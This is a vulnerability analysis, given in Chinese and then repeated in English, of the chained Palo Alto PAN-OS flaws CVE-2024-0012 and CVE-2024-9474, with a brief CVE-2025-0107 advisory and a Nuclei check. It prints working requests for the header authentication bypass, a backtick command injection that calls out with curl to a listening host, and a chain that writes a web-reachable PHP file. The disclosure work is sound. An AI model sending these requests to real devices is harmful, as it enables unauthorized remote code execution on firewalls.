@@ -1,0 +1,1481 @@
+Palo Alto 防火墙0day漏洞 CVE-2024-0012 和 CVE-2024-9474 检测POC&EXP
+免责声明：由于传播、利用本公众号李白你好所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号李白你好及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！
+
+
+
+1►
+
+CVE-2024-0012
+
+
+
+第 1 阶段 - 身份验证绕过 - CVE-2024-0012
+图片
+
+查看主要的 Nginx 路由配置 -/etc/nginx/conf/locations.conf发现了相当有限（但影响很大）的变化：
+add_header Allow "GET, HEAD, POST, PUT, DELETE, OPTIONS";
+ if ($request_method !~ ^(GET|HEAD|POST|PUT|DELETE|OPTIONS)$) {
+   return 405;
+ }
+
++proxy_set_header X-Real-IP "";
++proxy_set_header X-Real-Scheme "";
++proxy_set_header X-Real-Port "";
++proxy_set_header X-Real-Server-IP "";
++proxy_set_header X-Forwarded-For  "";
++proxy_set_header X-pan-ndpp-mode "";
++proxy_set_header Proxy "";
++proxy_set_header X-pan-AuthCheck 'on';
+
+
+ # rewrite_log on;
+
+ # static ones
+@@ -27,6 +17,5 @@ location /nginx_status {
+ location ~ \.js\.map$ {
+   add_header Cache-Control "no-cache; no-store";
+   proxy_pass_header Authorization;
++  include conf/proxy_default.conf;
+   proxy_pass http://$gohost$gohostExt;
+ }
+虽然看起来不多，但这里足以推断出 CVE-2024-0012 的入口点。
+这告诉我们什么？嗯，两件至关重要的事。
+首先，我们可以看到，在任何路由或处理的定义之前，已经设置了一堆请求标头，而事实并非如此 - 最重要的是，在定义任何路由处理之前，这个X-pan-AuthCheck控制身份验证的值现在被on默认设置为。
+其次，我们可以看到conf/proxy_default.conf（其中还设置了默认标头，包括 X-pan-AuthCheck）已被添加到.js.mapURI 处理程序中 - 而之前这是稍后设置的。
+经过一些快速推断，看起来在以前未修补的版本中，Nginx 之前没有在此指令内正确设置身份验证标头 - 这是否允许我们滥用 proxypass 声明来发送没有配置 HTTP 请求标头 X-pan-Authcheck 的请求到所谓的“受保护”的端点？
+利用我们对 Nginx proxypass 滥用案例的了解，我们思考了每个人都信任的保护其通信和内部网络安全的企业级安全设备的现状，并测试了各种变体，看看是否有任何一种可以让我们通过，例如：
+/php/ztp_gate.php%3f.js.map
+/php/ztp_gate.php?.js.map
+/php/ztp_gate.php#.js.map
+/php/ztp_gate.php/.js.map
+这些都不起作用：
+GET /php/ztp_gate.php/.js.map HTTP/1.1
+Host: 18.142.51.124
+
+HTTP/1.1 302 Found
+Date: Tue, 19 Nov 2024 10:04:27 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 0
+Connection: keep-alive
+Set-Cookie: PHPSESSID=bu82e0mthttbaqbp6djh0lgpd9; path=/; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /php/login.php?
+Cache-Control: no-cache; no-store
+我们有点闷闷不乐，直到头顶上出现了一道明亮的光。
+脚本uiEnvSetup.php要求HTTP_X_PAN_AUTHCHECK将值设置为off，这是之前被 Nginx 阻止的。也许我们可以直接提供它？
+稍微开明一点——我们再次尝试：
+GET /php/ztp_gate.php/.js.map HTTP/1.1
+Host: {{Hostname}}
+X-PAN-AUTHCHECK: off
+
+HTTP/1.1 200 OK
+Date: Tue, 19 Nov 2024 10:05:08 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 4635
+Connection: keep-alive
+Set-Cookie: PHPSESSID=m1sea0p2n2p89kncqked9sd2p1; path=/; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-cache, no-store, must-revalidate
+Pragma: no-cache
+Content-Security-Policy: default-src 'self'; connect-src 'self' data.pendo.io app.pendo.io pendo-static-5839728945463296.storage.googleapis.com; script-src 'self' 'unsafe-eval' 'unsafe-inline' app.pendo.io pendo-io-static.storage.googleapis.com cdn.pendo.io pendo-static-5839728945463296.storage.googleapis.com data.pendo.io; style-src 'self' 'unsafe-inline' app.pendo.io cdn.pendo.io pendo-static-5839728945463296.storage.googleapis.com; img-src 'self' data: cdn.pendo.io app.pendo.io pendo-static-5839728945463296.storage.googleapis.com data.pendo.io; frame-ancestors 'self' app.pendo.io; child-src 'self' app.pendo.io; form-action 'self' 'unsafe-eval' 'unsafe-inline'
+Strict-Transport-Security: max-age=31536000
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+X-XSS-Protection: 1; mode=block
+Cache-Control: no-cache; no-store
+
+<html>
+
+<head>
+    <title>Zero Touch Provisioning</title>
+我们只需……将off值提供给X-PAN-AUTHCHECKHTTP 请求标头，服务器就会自动关闭身份验证？！此时，为什么有人感到惊讶？
+没错，各位，这是一个CVE-2024-0012 的简单复现器。再简单不过了。
+进入第二阶段，privesc 漏洞！
+
+2►
+
+CVE-2024-9474
+
+
+
+现在闸门已经打开，各种后认证 PHP 功能都已触手可及。通常从现在开始，下一步 RCE 就取决于我们的创造力了。
+让我们通过继续差异分析来看看威胁行为者发现了什么。
+图片
+一个令我们非常关注的文件是 中的更改/var/appweb/htdocs/php-packages/panui_core/src/log/AuditLog.php，它揭示了一个非常诚实的命令注入：
+<?php
+
+namespace panui_core\log;
+
+use pan_core\InjectableClass;
+use pan_process\Process;
+use pan_process\ShellSanitizer;
+
+class AuditLog extends InjectableClass
+{
+  public function write($username, $message) {
+    /** @var ShellSanitizer */
+    $s = $this->ioc->get(ShellSanitizer::class);
+    $msg = $s->escapeshellarg($message);
+
+    /** @var Process */
+    $p = $this->ioc->get(Process::class);
+-    return $p->pexecute("/usr/local/bin/pan_elog -u audit -m $msg -o $username");
++    $u = $s->escapeshellarg($username);
++    return $p->pexecute("/usr/local/bin/pan_elog -u audit -m $msg -o $u");
+  }
+}
+没有比这更直接的了。
+不知何故，用户能够将包含 shell 元字符的用户名传递给AuditLog.write()函数，然后将其值传递给pexecute()。
+查看其他更改时，我们发现一个更改相当大的文件 - /var/appweb/htdocs/php/utils/createRemoteAppwebSession.php。
+<?php
+
+WebSession::start();
+
+/** @noinspection PhpUndefinedFunctionInspection */
+$isCms = panui_platform_is_cms();
+if ($isCms == 0) {
+    // create a remote appweb session only on a device
+    // 'vsys' is the list of accessible vsys for the user. If blank then it means all vsys
+
+    $locale = isset($_POST['locale']) ? $_POST['locale'] : $_SESSION['locale'];
++    $user = $_POST['user'];
++    $userRole = $_POST['userRole'];
++    $remoteHost = $_POST['remoteHost'];
++    $vsys = $_POST['vsys'];
++    $editShared = $_POST['editShared'];
++    $protocol = $_POST['prot'];
++    $serverPort = $_SERVER['SERVER_PORT'];
++    $rbaXml = $_POST['rbaxml'];
++    $hideHeaderBg = $_POST['hideHeaderBg'];
++    if (strlen($user) <= 63
++        && strlen ($userRole) < 256
++        && strlen ($remoteHost) < 256
++        && strlen ($vsys) < 128
++        && strlen ($editShared) < 128
++        && strlen ($protocol) < 128
++        && strlen ($serverPort) < 128
++        && strlen ($rbaXml) < 1024 * 1024
++        && strlen ($locale) < 256
++        && strlen ($hideHeaderBg) < 128
++    ) {
+        /** @noinspection PhpUndefinedFunctionInspection */
+        panCreateRemoteAppwebSession(
+-            $_POST['user'],
++            $user,
+-            $_POST['userRole'],
++            $userRole,
+-            $_POST['remoteHost'],
++            $remoteHost,
+-            $_POST['vsys'],
++            $vsys,
+-            $_POST['editShared'],
++            $editShared,
+-            $_POST['prot'],
++            $protocol,
+-            $_SERVER['SERVER_PORT'],
++            $serverPort,
+-            $_POST['rbaxml'],
++            $rbaXml,
+            $locale,
+-            $_POST['hideHeaderBg'],
++            $hideHeaderBg
+        );
++    } else {
++        error_log("An invalid attempt was made with mismatched lengths while attempting to create a remote appweb session");
++    }
+}
+
+session_write_close();
+
+在我们进一步讨论之前，我们对此功能的理解有点疯狂。
+我们的理解是，此功能可让 Palo Alto Panorama 用户有效地“跳入”连接的 SSLVPN/防火墙设备 - 如上所示，无需实际身份验证（即有效密码）。此功能允许 Palo Alto Panorma 设备指定他们想要模拟的用户、用户角色等 - 并以非常友好的方式提供完全经过身份验证、无需 2FA 的有效 PHP 会话 ID。
+初看之下，很明显该功能似乎是根据收到的 HTTP 请求中传递的 POST 参数值创建一个 PHP 会话（针对看似任意的用户和看似任意的角色）。
+一瞬间，我们被引入的长度检查吓了一跳——这会不会成为某种不寻常的内存损坏漏洞？然后我们笑了，因为从来没有任何看起来像是复杂的东西需要用到设备中。
+我们的理论很简单 - 通过“用户”参数传递的值可能会进入$_SESSION ['userName']，正如我们上面看到的，它看起来像是命令注入漏洞补丁的来源。
+不用担心 - 我们决定继续并创建一个有效的 HTTP 请求，使用我们前面提到的身份验证绕过，以及“用户”键的 HTTP post 参数值，其中包含curl对我们的外部监听主机的简单命令：
+POST /php/utils/createRemoteAppwebSession.php/aaaa.js.map HTTP/1.1
+Host: {{Hostname}}
+X-PAN-AUTHCHECK: off
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 99
+
+user=`curl {{listening-host}}`&userRole=superuser&remoteHost=&vsys=vsys1
+这将返回一个很好的 PHP 会话 ID 值：
+HTTP/1.1 200 OK
+Date: Tue, 19 Nov 2024 09:06:44 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 48
+Connection: keep-alive
+Set-Cookie: PHPSESSID=isbhbjpdkhvmkhio0hcpsgmtk6; path=/; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Cache-Control: no-cache; no-store
+
+@start@PHPSESSID=isbhbjpdkhvmkhio0hcpsgmtk6@end@
+快速查看文件系统表明我们的有效载荷紧密位于会话内容中，并且如预期的那样，位于“userName”键中（即 $_SESSION['userName']）：
+[root@PA-VM /]# cat ./opt/pancfg/mgmt/phpsessions/sess_isbhbjpdkhvmkhio0hcpsgmtk6
+cmsRemoteSession|s:1:"1";panorama_sessionid|s:5:"dummy";user|s:16:"XXXX";userName|s:52:"`curl {{listening-host}}`";userRole|s:9:"superuser"
+在这里，我们希望诚实地给出这个漏洞的真正位置，从源头到终端，的完整追踪，但是，有时候，你只需要用大锤而不是镊子。
+将有效载荷注入到正确的位置后，我们开始用闪亮的攻击所有端点PHPSESSID。由于受命令注入影响的代码位于审计日志编写代码中，我们只是冒险并发出了请求 - 使用我们在 index.php 上新创建和伪造的 PHP 会话。
+GET /index.php/.js.map HTTP/1.1
+Host: {{Hostname}}
+Cookie: PHPSESSID=2jq4l1nv43idudknmhj830vdde;
+X-PAN-AUTHCHECK: off
+Connection: keep-alive
+底层的命令看起来有点像这样（感谢pspy！）：
+CMD: UID=0     PID=87502  | sh -c export panusername="`curl {{listening-host}}`";export superuser="1";export isxml="yes";/usr/local/bin/sdb -e -n ha.app.local.state
+请暂停一下。现在是 2024 年。我们已经表明了我们的观点，所以我们不再多说了。
+完整的链条看起来是这样的：
+POST /php/utils/createRemoteAppwebSession.php/watchTowr.js.map HTTP/1.1
+Host: {{Hostname}}
+X-PAN-AUTHCHECK: off
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 107
+
+user=`echo $(uname -a) > /var/appweb/htdocs/unauth/watchTowr.php`&userRole=superuser&remoteHost=&vsys=vsys1
+
+GET /index.php/.js.map HTTP/1.1
+Host: {{Hostname}}
+Cookie: PHPSESSID=2qe3kouhjdm8317f6vmueh1m8n;
+X-PAN-AUTHCHECK: off
+Connection: keep-alive
+
+GET /unauth/watchTowr.php HTTP/1.1
+Host: 192.168.1.227
+Cookie: PHPSESSID=fvepfik7vrmvdlkns30rgpn1jb;
+X-PAN-AUTHCHECK: off
+Connection: keep-alive
+这会导致我们注入的命令被执行：
+HTTP/1.1 200 OK
+Date: Tue, 19 Nov 2024 09:39:17 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 108
+Connection: keep-alive
+Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
+
+Linux PA-VM 4.18.0-240.1.1.20.pan.x86_64 #1 SMP Wed Jul 31 20:37:12 PDT 2024 x86_64 x86_64 x86_64 GNU/Linu
+参考链接：
+
+https://labs.watchtowr.com/pots-and-pans-aka-an-sslvpn-palo-alto-pan-os-cve-2024-0012-and-cve-2024-9474/
+
+
+
+3►
+
+Nuclei-POC
+
+
+
+于是，又一种超级安全的下一代强化安全设备诞生了。
+这次是由于那些讨厌的反引号，再加上要求服务器不要通过检查我们的身份验证的超级复杂步骤X-PAN-AUTHCHECK。
+图片
+令人惊奇的是，这两个漏洞竟然存在于生产设备中，而且是通过隐藏在 Palo Alto 设备内部的大量 Shell 脚本调用实现的。
+老读者可能会期待一个不错的 PoC，虽然我们很乐意提供一个，但我们会推迟一周左右发布，以让管理员有时间进行修补 - 但相反，我们发布了一个 Nuclei 模板，您可以使用它来检查您的主机是否受到影响。
+CVE-2024-0012-POC
+id: palo-alto-vpn-CVE-2024-0012-check-wt
+
+info:
+  name: Palo Alto PAN-OS Authentication Bypass in the Management Web Interface CVE-2024-0012
+  author: watchTowr
+  severity: critical
+  description: An authentication bypass in Palo Alto Networks PAN-OS software enables an unauthenticated attacker with network access to the management web interface to gain PAN-OS administrator privileges to perform administrative actions, tamper with the configuration, or exploit other authenticated privilege escalation vulnerabilities like CVE-2024-9474.
+  tags: palo-alto
+  metadata:
+    max-request: 4
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/php/utils/CmsGetDeviceSoftwareVersion.php/.js.map"
+
+    headers:
+      X-PAN-AUTHCHECK: off
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: or
+        words:
+          - "0.0.0"
+
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "Expires: 0"
+          - "PHPSESSID="
+          - "application/json"
+
+
+CVE-2024-9474-POC
+
+
+
+PAN-OS auth bypass + RCE
+
+图片
+
+https://github.com/Chocapikk/CVE-2024-9474
+
+
+==================================================================================================
+==================================================================================================
+==================================================================================================
+
+
+PaloAlto-Expedition OS命令注入漏洞 (CVE-2025-0107)
+图片
+图片
+图片
+内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的POC信息及POC对应脚本而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号Nday Poc及作者不为此承担任何责任，一旦造成后果请自行承担！
+
+
+01
+漏洞概述
+
+Palo Alto Networks Expedition 中存在一个作系统命令注入漏洞，未经身份验证的攻击者可利用该漏洞，以 Expedition 中的 www-data 用户身份运行任意作系统命令，从而导致运行 PAN-OS 软件的防火墙的用户名、明文密码、设备配置和设备 API 密钥泄露。
+02
+搜索引擎
+
+FOFA:
+title="Expedition Project"
+图片
+
+03
+漏洞复现
+图片
+
+04
+自查工具
+
+nuclei
+
+图片
+afrog
+
+图片
+xray
+
+图片
+
+
+05
+修复建议
+
+1、关闭互联网暴露面或接口设置访问权限
+
+2、升级至1.2.101及更新版本
+
+
+
+==================================================================================================
+==================================================================================================
+==================================================================================================
+
+
+Gain early access to our research, and understand your exposure - request a demo of the watchTowr Platform!
+
+watchTowr Labs
+Home
+Search
+The watchTowr Platform
+Request A Demo
+Vuln. Disclosure Policy
+Disclosed Vulnerabilities
+By — Sonny   —   Nov 19, 2024
+Pots and Pans, AKA an SSLVPN - Palo Alto PAN-OS CVE-2024-0012 and CVE-2024-9474
+Pots and Pans, AKA an SSLVPN - Palo Alto PAN-OS CVE-2024-0012 and CVE-2024-9474
+It'll be no surprise that 2024, 2023, 2022, and every other year of humanities' existence has been tough for SSLVPN appliances.
+
+Anyhow, there are new vulnerabilities (well, two of them) that are being exploited in the Palo Alto Networks firewall and SSLVPN offering, and as ever, we’re here to locate it.
+
+Here's a quick teaser of what we achieved to whet your appetite:
+
+
+Yep! Command injection! Every attacker's favourite vulnerability class, allowing for simple and easy exploitation (once you know how).
+
+As I'm sure you can imagine, analysing vulnerabilities under active exploitation is more than a requirement here at watchTowr, its a passion, and a calling. We're no stranger to Palo Alto Network (Palo Alto from here on, because typing) devices - longtime readers will remember when we raced to analyse CVE-2024-3400 earlier this year.
+
+Over the last few weeks, we’ve been closely monitoring a new vulnerability, teased at various different phases. It started off as an ‘informational disclosure’, a whiff of a rumour of a critical vulnerability, the only public detail that it was reachable from the device’s management interface.
+
+Kudos to Palo Alto for warning its customers of a potential vulnerability before confirming it, and releasing patches as soon as possible. The general security posture of the device is such that mitigations were in place to restrict access to the management interface via a strict ruleset of IP whitelisting.
+
+After a while, the rumour turned into an incremental advisory, arriving complete with indicators of compromise (such as IP addresses and webshell hashes), and then the ‘bomb dropped’ on Monday when the official advisories for CVE-2024-0012 and CVE-2024-9474 were announced.
+
+This is a pair of vulnerabilities, described as ‘Authentication Bypass in the Management Web Interface’ and a ‘Privilege Escalation‘ respectively, strongly suggesting they are used as a chain to gain superuser access, a pattern that we’ve seen before with Palo Alto appliances. Before we’ve even dived into to code, we’ve already ascertained that we’re looking for a chain of vulnerabilities to achieve that coveted pre-authenticated Remote Code Execution.
+
+With the patches released, it is time to go diffing for that gold! By looking at a pre-patched 10.2.12-h1 and a patched 10.2.12-h2 of ‘Palo Alto VM-Series Next-Gen Virtual Firewall w/Advanced Threat Prevention.’
+
+We won’t go through jailbreaking the appliance - this has been covered in detail by various sources, so we’re just going to assume that a motivated reader has already performed this step.
+
+Instead, we start our journey by learning the structure and flow of data within the appliance’s management interface. Buckle up as we relay what we’ve learned.
+
+The main application is of the absolutely stellar PHP language, and is served by an Apache server, fronted by an Nginx reverse proxy.
+
+The server itself is rife with PHP scripts, residing within the /var/appweb/htdocs/ directory. However, when accessing these scripts from a web browser, we’re met with a redirect to the login page (hardly unsurprising).
+
+We spent quite some time looking through the Nginx config, Apache config, and the PHP scripts themselves to figure out why this was happening, and after a lot of effort we discovered the entry point to the PHP application is actually intended to be another, totally different PHP script.
+
+Take a look at this gem of a hack in the php.ini file:
+
+auto_prepend_file = uiEnvSetup.php ; PAN-MODIFIED
+We guess auto_prepend_file actually has legitimate use besides writing PHP exploits. Anyway, if we look through the uiEnvSetup.php file, we can see the script that’s performing the redirect:
+
+if (
+    $_SERVER['HTTP_X_PAN_AUTHCHECK'] != 'off'
+    && $_SERVER['PHP_SELF'] !== '/CA/ocsp'
+    &&  $_SERVER['PHP_SELF'] !== '/php/login.php'
+    && stristr($_SERVER['REMOTE_HOST'], '127.0.0.1') === false
+) {
+    $_SERVER['PAN_SESSION_READONLY'] = true;
+    $ws = WebSession::getInstance($ioc);
+    $ws->start();
+    $ws->close();
+    // these are horrible hacks.
+    // This whole code should be removed and only make available to a few pages: main, debug, etc.
+    if (
+        !Str::startsWith($_SERVER['PHP_SELF'], '/php-packages/panorama_webui/php/api/index.php')
+        && !Str::startsWith($_SERVER['PHP_SELF'], '/php-packages/firewall_webui/php/api/index.php')
+    ) {
+        if (Backend::quickSessionExpiredCheck()) {
+            if (isset($_SERVER['QUERY_STRING'])) {
+                Util::login($_SERVER['QUERY_STRING']);
+            } else {
+                Util::login();
+            }
+            exit(1);
+        }
+    }
+}
+As you can see above, we present to you an example of PAN-OS's management interface auth boundary - the check that compares the HTTP header HTTP_X_PAN_AUTHCHECK with the ASCII value off.
+
+Initially, on seeing this code, we took the world for what it is and thought - perhaps we could just specify X-Pan-Authcheck: off in our requests to disable authentication entirely - but, as ever, life is not that simple. Our requests still resulted in a login page - clearly, not what we want.
+
+After some more digging, we found that the X-Pan-Authcheck header is set by default to on via the /etc/nginx/conf/proxy_default.conf file:
+
+# default proxy request header setting
+proxy_set_header Host $host;
+proxy_set_header X-Real-IP $remote_addr;
+proxy_set_header X-Real-Scheme $scheme;
+proxy_set_header X-Real-Port $server_port;
+proxy_set_header X-Real-Server-IP $server_addr;
+proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;
+proxy_set_header X-pan-ndpp-mode $pan_ndpp_mode;
+proxy_set_header Proxy "";
+proxy_set_header X-pan-AuthCheck $panAuthCheck;
+proxy_max_temp_file_size 0;
+This configuration file is included in the primary Nginx file - but, there is a mistake. More later.
+
+Throughout the Nginx configuration, the value of $panAuthCheck is toggled based on the routes being called.
+
+For example, the /unauth/ dir, which (as you’d expect) requires no auth, is handled like this:
+
+if ($uri ~ ^\\/unauth\\/.+$) {
+  set $panAuthCheck 'off';
+}
+Looked fun, but - why read, when you can continue to diff?
+
+Fortunately, there is only a small variation change between 10.2.12-h1 and 10.2.12-h2 , only a 5MB difference in size - how hard could it be?
+
+Like most diffing adventures, we mounted the vdmk's to an Ubuntu instance and extracted the whole file system; after hours of looking, mysteriously, no difference could be discovered.
+
+Not accepting the possibility that the patch was somehow invisible to the naked eye, we had an idea. Having spent some time recently diving through FortiManager’s file system, which holds the root filesystem in memory, as opposed to on disk, we thought - could it be Palo Alto have a similar setup, but with their patch process? Could it be that the patch is applied at boot-time, every time the appliance is started?
+
+After booting up each respective version and jailbreaking them, we began painfully extracting the file system using SCP.
+
+Whilst there was no significant change, there was enough to get our noses pointing in the direction.
+
+Phase 1 - Authentication Bypass - CVE-2024-0012
+Looking at the primary Nginx route configuration - /etc/nginx/conf/locations.conf - revealed quite a limited (yet impactful) change:
+
+add_header Allow "GET, HEAD, POST, PUT, DELETE, OPTIONS";
+ if ($request_method !~ ^(GET|HEAD|POST|PUT|DELETE|OPTIONS)$) {
+   return 405;
+ }
+ 
++proxy_set_header X-Real-IP "";
++proxy_set_header X-Real-Scheme "";
++proxy_set_header X-Real-Port "";
++proxy_set_header X-Real-Server-IP "";
++proxy_set_header X-Forwarded-For  "";
++proxy_set_header X-pan-ndpp-mode "";
++proxy_set_header Proxy "";
++proxy_set_header X-pan-AuthCheck 'on';
+
+
+ # rewrite_log on;
+ 
+ # static ones
+@@ -27,6 +17,5 @@ location /nginx_status {
+ location ~ \.js\.map$ {
+   add_header Cache-Control "no-cache; no-store";
+   proxy_pass_header Authorization;
++  include conf/proxy_default.conf;
+   proxy_pass http://$gohost$gohostExt;
+ }
+While it doesn’t look like much, there’s enough here to deduce the entry point to CVE-2024-0012.
+
+What does this tell us? Well, two vital things.
+
+Firstly, we can see that a bunch of request headers are now being set before any definitions of routes or processing takes place, where they weren't - most importantly, this X-pan-AuthCheck value that controls authentication is now being set to on by default before any route handling is defined.
+
+Secondly, we can see that conf/proxy_default.conf (where default headers are also set, including X-pan-AuthCheck) has been added to the handler for .js.map URIs - where before this was set later.
+
+Doing some quick deductions, it looks like the authentication header wasn’t correctly set by Nginx previously within this directive in previous unpatched versions - could this allow us to abuse the proxypass declaration to send requests that did not have the HTTP request header X-pan-Authcheck configured, to supposedly 'protected' endpoints?
+
+Leveraging our knowledge of Nginx proxypass abuse cases, we pondered about the state of enterprise-grade security appliances that everyone trusts to secure their communications and internal networks - and blasted variations to see if any would allow us through, for example:
+
+/php/ztp_gate.php%3f.js.map
+/php/ztp_gate.php?.js.map
+/php/ztp_gate.php#.js.map
+/php/ztp_gate.php/.js.map
+None of which worked:
+
+GET /php/ztp_gate.php/.js.map HTTP/1.1
+Host: 18.142.51.124
+
+HTTP/1.1 302 Found
+Date: Tue, 19 Nov 2024 10:04:27 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 0
+Connection: keep-alive
+Set-Cookie: PHPSESSID=bu82e0mthttbaqbp6djh0lgpd9; path=/; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /php/login.php?
+Cache-Control: no-cache; no-store
+We were somewhat glum, until a bright light came on over our heads.
+
+The uiEnvSetup.php script expects the HTTP_X_PAN_AUTHCHECK value to be set to off, something that was blocked by Nginx previously. Maybe we can just supply it?
+
+Slightly more enlightened - we tried again:
+
+GET /php/ztp_gate.php/.js.map HTTP/1.1
+Host: {{Hostname}}
+X-PAN-AUTHCHECK: off
+
+HTTP/1.1 200 OK
+Date: Tue, 19 Nov 2024 10:05:08 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 4635
+Connection: keep-alive
+Set-Cookie: PHPSESSID=m1sea0p2n2p89kncqked9sd2p1; path=/; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-cache, no-store, must-revalidate
+Pragma: no-cache
+Content-Security-Policy: default-src 'self'; connect-src 'self' data.pendo.io app.pendo.io pendo-static-5839728945463296.storage.googleapis.com; script-src 'self' 'unsafe-eval' 'unsafe-inline' app.pendo.io pendo-io-static.storage.googleapis.com cdn.pendo.io pendo-static-5839728945463296.storage.googleapis.com data.pendo.io; style-src 'self' 'unsafe-inline' app.pendo.io cdn.pendo.io pendo-static-5839728945463296.storage.googleapis.com; img-src 'self' data: cdn.pendo.io app.pendo.io pendo-static-5839728945463296.storage.googleapis.com data.pendo.io; frame-ancestors 'self' app.pendo.io; child-src 'self' app.pendo.io; form-action 'self' 'unsafe-eval' 'unsafe-inline'
+Strict-Transport-Security: max-age=31536000
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+X-XSS-Protection: 1; mode=block
+Cache-Control: no-cache; no-store
+
+<html>
+
+<head>
+    <title>Zero Touch Provisioning</title>
+We simply… supply the off value to the X-PAN-AUTHCHECK HTTP request header, and the server helpfully turns off authentication?! At this point, why is anyone surprised?
+
+That’s right folks, a simple reproducer for CVE-2024-0012. It couldn't be easier than that.
+
+On to phase 2, the privesc vulnerability!
+
+Phase 2 - Privilege Escalation - CVE-2024-9474
+Now the floodgates are open, and there is all sorts of post-authentication PHP functionality now within our grasp. Typically from this point, it’s down to our creativity to find the next step to RCE.
+
+Let’s take a look at what the threat actors found by continuing our diff.
+
+One file that stood out to us like a sore thumb was the change in /var/appweb/htdocs/php-packages/panui_core/src/log/AuditLog.php , which reveals a quite honest command injection:
+
+<?php
+
+namespace panui_core\log;
+
+use pan_core\InjectableClass;
+use pan_process\Process;
+use pan_process\ShellSanitizer;
+
+class AuditLog extends InjectableClass
+{
+  public function write($username, $message) {
+    /** @var ShellSanitizer */
+    $s = $this->ioc->get(ShellSanitizer::class);
+    $msg = $s->escapeshellarg($message);
+
+    /** @var Process */
+    $p = $this->ioc->get(Process::class);
+-    return $p->pexecute("/usr/local/bin/pan_elog -u audit -m $msg -o $username");
++    $u = $s->escapeshellarg($username);
++    return $p->pexecute("/usr/local/bin/pan_elog -u audit -m $msg -o $u");
+  }
+}
+It couldn’t be more straightforward than this.
+
+Somehow a user is able to pass a username containing shell metacharacters into the AuditLog.write() function, which then passes its value to pexecute() .
+
+Looking at other changes, we discovered a file with quite a large change - /var/appweb/htdocs/php/utils/createRemoteAppwebSession.php.
+
+<?php
+
+WebSession::start();
+
+/** @noinspection PhpUndefinedFunctionInspection */
+$isCms = panui_platform_is_cms();
+if ($isCms == 0) {
+    // create a remote appweb session only on a device
+    // 'vsys' is the list of accessible vsys for the user. If blank then it means all vsys
+
+    $locale = isset($_POST['locale']) ? $_POST['locale'] : $_SESSION['locale'];
++    $user = $_POST['user'];
++    $userRole = $_POST['userRole'];
++    $remoteHost = $_POST['remoteHost'];
++    $vsys = $_POST['vsys'];
++    $editShared = $_POST['editShared'];
++    $protocol = $_POST['prot'];
++    $serverPort = $_SERVER['SERVER_PORT'];
++    $rbaXml = $_POST['rbaxml'];
++    $hideHeaderBg = $_POST['hideHeaderBg'];
++    if (strlen($user) <= 63
++        && strlen ($userRole) < 256
++        && strlen ($remoteHost) < 256
++        && strlen ($vsys) < 128
++        && strlen ($editShared) < 128
++        && strlen ($protocol) < 128
++        && strlen ($serverPort) < 128
++        && strlen ($rbaXml) < 1024 * 1024
++        && strlen ($locale) < 256
++        && strlen ($hideHeaderBg) < 128
++    ) {
+        /** @noinspection PhpUndefinedFunctionInspection */
+        panCreateRemoteAppwebSession(
+-            $_POST['user'],
++            $user,
+-            $_POST['userRole'],
++            $userRole,
+-            $_POST['remoteHost'],
++            $remoteHost,
+-            $_POST['vsys'],
++            $vsys,
+-            $_POST['editShared'],
++            $editShared,
+-            $_POST['prot'],
++            $protocol,
+-            $_SERVER['SERVER_PORT'],
++            $serverPort,
+-            $_POST['rbaxml'],
++            $rbaXml,
+            $locale,
+-            $_POST['hideHeaderBg'],
++            $hideHeaderBg
+        );
++    } else {
++        error_log("An invalid attempt was made with mismatched lengths while attempting to create a remote appweb session");
++    }
+}
+
+session_write_close();
+Before we go further, our understanding for this functionality is a little insane.
+Our understanding is that this functionality is for users of Palo Alto Panorama to effectively 'jump into' connected SSLVPN/firewall devices - as you can see above though, with no actual authentication (i.e. valid password) required. This functionality allows a Palo Alto Panorma device to specify the user, user role and more that they would like to impersonate - and in a very friendly way, be provided with a fully authenticated, 2FA-not-required, valid PHP session ID.
+When first looking at this, it's quite clear the functionality appears to be creating a PHP session - for a seemingly arbitrary user, and seemingly arbitrary role - based on the values of POST parameters passed in the HTTP request received.
+
+For a second, we were thrown off by the introduced length checks - was this about to become some unusual memory corruption vulnerability? And then we chuckled, because never has anything remotely looking like complexity been needed with an appliance.
+
+Our theory was simple - the value being passed via the 'user' parameter was likely going into $_SESSION['userName'] that as we saw above was the source of what looked like a patch for a command injection vulnerability.
+
+Fret not - we decided to proceed and created a valid HTTP request, using our aforementioned auth bypass, and an HTTP post parameter value for the 'user' key containing a simple curl command to our external listening host:
+
+POST /php/utils/createRemoteAppwebSession.php/aaaa.js.map HTTP/1.1
+Host: {{Hostname}}
+X-PAN-AUTHCHECK: off
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 99
+
+user=`curl {{listening-host}}`&userRole=superuser&remoteHost=&vsys=vsys1
+This returns us a nice PHP session ID value:
+
+HTTP/1.1 200 OK
+Date: Tue, 19 Nov 2024 09:06:44 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 48
+Connection: keep-alive
